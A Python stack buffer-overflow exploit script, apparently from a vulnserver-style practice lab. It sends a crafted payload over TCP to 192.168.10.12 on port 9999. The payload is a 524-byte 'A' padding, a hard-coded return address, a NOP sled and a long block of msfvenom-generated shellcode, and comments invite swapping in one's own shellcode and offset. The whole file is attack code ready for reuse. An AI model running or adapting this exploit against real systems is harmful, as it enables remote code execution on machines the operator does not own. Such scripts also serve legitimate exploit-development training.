#!/usr/bin/python
import sys
import socket

# replace the shellcode with yours generated by msfvenom
shellcode = b""
shellcode += b"\xdd\xc1\xd9\x74\x24\xf4\xba\x6c\xd8\xa7\xb6"
shellcode += b"\x5e\x33\xc9\xb1\x52\x31\x56\x17\x83\xc6\x04"
shellcode += b"\x03\x3a\xcb\x45\x43\x3e\x03\x0b\xac\xbe\xd4"
shellcode += b"\x6c\x24\x5b\xe5\xac\x52\x28\x56\x1d\x10\x7c"
shellcode += b"\x5b\xd6\x74\x94\xe8\x9a\x50\x9b\x59\x10\x87"
shellcode += b"\x92\x5a\x09\xfb\xb5\xd8\x50\x28\x15\xe0\x9a"
shellcode += b"\x3d\x54\x25\xc6\xcc\x04\xfe\x8c\x63\xb8\x8b"
shellcode += b"\xd9\xbf\x33\xc7\xcc\xc7\xa0\x90\xef\xe6\x77"
shellcode += b"\xaa\xa9\x28\x76\x7f\xc2\x60\x60\x9c\xef\x3b"
shellcode += b"\x1b\x56\x9b\xbd\xcd\xa6\x64\x11\x30\x07\x97"
shellcode += b"\x6b\x75\xa0\x48\x1e\x8f\xd2\xf5\x19\x54\xa8"
shellcode += b"\x21\xaf\x4e\x0a\xa1\x17\xaa\xaa\x66\xc1\x39"
shellcode += b"\xa0\xc3\x85\x65\xa5\xd2\x4a\x1e\xd1\x5f\x6d"
shellcode += b"\xf0\x53\x1b\x4a\xd4\x38\xff\xf3\x4d\xe5\xae"
shellcode += b"\x0c\x8d\x46\x0e\xa9\xc6\x6b\x5b\xc0\x85\xe3"
shellcode += b"\xa8\xe9\x35\xf4\xa6\x7a\x46\xc6\x69\xd1\xc0"
shellcode += b"\x6a\xe1\xff\x17\x8c\xd8\xb8\x87\x73\xe3\xb8"
shellcode += b"\x8e\xb7\xb7\xe8\xb8\x1e\xb8\x62\x38\x9e\x6d"
shellcode += b"\x24\x68\x30\xde\x85\xd8\xf0\x8e\x6d\x32\xff"
shellcode += b"\xf1\x8e\x3d\xd5\x99\x25\xc4\xbe\x65\x11\xcc"
shellcode += b"\x2d\x0e\x60\xd0\x55\xac\xed\x36\x3f\x20\xb8"
shellcode += b"\xe1\xa8\xd9\xe1\x79\x48\x25\x3c\x04\x4a\xad"
shellcode += b"\xb3\xf9\x05\x46\xb9\xe9\xf2\xa6\xf4\x53\x54"
shellcode += b"\xb8\x22\xfb\x3a\x2b\xa9\xfb\x35\x50\x66\xac"
shellcode += b"\x12\xa6\x7f\x38\x8f\x91\x29\x5e\x52\x47\x11"
shellcode += b"\xda\x89\xb4\x9c\xe3\x5c\x80\xba\xf3\x98\x09"
shellcode += b"\x87\xa7\x74\x5c\x51\x11\x33\x36\x13\xcb\xed"
shellcode += b"\xe5\xfd\x9b\x68\xc6\x3d\xdd\x74\x03\xc8\x01"
shellcode += b"\xc4\xfa\x8d\x3e\xe9\x6a\x1a\x47\x17\x0b\xe5"
shellcode += b"\x92\x93\x2b\x04\x36\xee\xc3\x91\xd3\x53\x8e"
shellcode += b"\x21\x0e\x97\xb7\xa1\xba\x68\x4c\xb9\xcf\x6d"
shellcode += b"\x08\x7d\x3c\x1c\x01\xe8\x42\xb3\x22\x39"

return_address = "\xF3\x12\x17\x31"
value_d = '\x90' * 30

offset = 524  # replace it with your offset genereted by msf-pattern_offset
payload = "A" * offset + return_address + value_d + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.10.12', 9999))
    s.send((payload))
    #s.send(('TRUN /.:/' + payload))
    print("[+] Got root? xD")
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
